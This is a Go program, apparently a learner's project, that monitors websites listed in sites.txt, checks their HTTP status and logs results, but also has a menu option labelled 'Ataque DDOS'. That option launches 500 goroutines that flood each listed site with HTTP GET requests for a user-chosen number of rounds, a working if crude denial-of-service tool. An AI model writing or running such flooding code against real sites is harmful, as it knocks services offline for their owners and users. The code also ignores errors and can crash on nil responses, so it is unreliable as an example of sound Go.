package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

const monitoramentos = 3
const delay = 5

func main() {

	exibeIntroducao()

	for {
		exibeMenu()

		comando := leComando()

		switch comando {
		case 1:
			iniciarMonitoramento()
		case 2:
			fmt.Println("Exibindo logs...")
			imprimeLogs()
		case 3:
			fmt.Println("Saindo do programa!")
			os.Exit(0)
		case 4:
			fmt.Println("Digite a quantidade de requisições:")
			requests := leComando()
			fmt.Println("Ataque DDOS iniciado!")
			ataqueDdos(requests)
		default:
			fmt.Println("O comando não existe!")
			os.Exit(-1)
		}
	}

}

func exibeIntroducao() {
	nome := "Wilson"
	versao := 1.1

	fmt.Println("Olá, Sr.!", nome)
	fmt.Println("Esse programa está na versão", versao)
}

func exibeMenu() {
	fmt.Println("1 - Iniciar monitoramento")
	fmt.Println("2 - Exibir logs")
	fmt.Println("3 - Sair do programa")
	fmt.Println("4 - Ataque DDOS")
}

func leComando() int {
	var comandoLido int
	fmt.Scan(&comandoLido)
	fmt.Println("O comando lido foi: ", comandoLido)

	return comandoLido
}

func testaSite(site string) {
	resp, err := http.Get(site)

	if err != nil {
		fmt.Println("Erro na requisição do site!", err)
	}

	if resp.StatusCode == 200 {
		fmt.Println("Site:", site, "foi carregado com sucesso!")
		registraLog(site, true)
	} else {
		fmt.Println("Site:", site, "está com problemas. Status Code:", resp.StatusCode)
		registraLog(site, false)
	}
}

func iniciarMonitoramento() {
	fmt.Println("Monitorando...")
	sites := lerSitesDoArquivo()

	for i := 0; i < monitoramentos; i++ {

		for i, site := range sites {
			fmt.Println("Testando site: ", i, "Site: ", site)
			testaSite(site)
		}

		time.Sleep(delay * time.Second)
		fmt.Println("")
	}
}

func lerSitesDoArquivo() []string {
	var sites []string

	arquivo, err := os.Open("sites.txt")

	if err != nil {
		fmt.Println("Erro ao ler o arquivo de sites!", err)
	}

	leitor := bufio.NewReader(arquivo)

	for {
		linha, err := leitor.ReadString('\n')

		if err == io.EOF {
			break
		}

		linha = strings.TrimSpace(linha)
		sites = append(sites, linha)
	}

	arquivo.Close()

	return sites
}

func registraLog(site string, status bool) {
	arquivo, err := os.OpenFile("log.txt", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)

	if err != nil {
		fmt.Println("Erro ao abrir o arquivo de log!", err)
	}

	arquivo.WriteString(time.Now().Format("02/01/2006 15:04:05") + " | " + site + " -> online: " + strconv.FormatBool(status) + "\n")

	arquivo.Close()
}

func imprimeLogs() {
	arquivo, err := ioutil.ReadFile("log.txt")

	if err != nil {
		fmt.Println("Erro ao ler o arquivo de log!", err)
	}

	fmt.Println(string(arquivo))
}

func atacarSite(data chan string) {

	for site := range data {
		response, _ := http.Get(site)
		fmt.Println("Site: ", site, "Response: ", response.StatusCode)
	}

}

func ataqueDdos(requests int) {
	fmt.Println("Executando...")
	sites := lerSitesDoArquivo()

	ch := make(chan string)

	for i := 0; i < 500; i++ {
		go atacarSite(ch)
	}

	for i := 0; i < requests; i++ {

		fmt.Println("Request:", i)

		for _, site := range sites {

			ch <- site

		}
	}

}
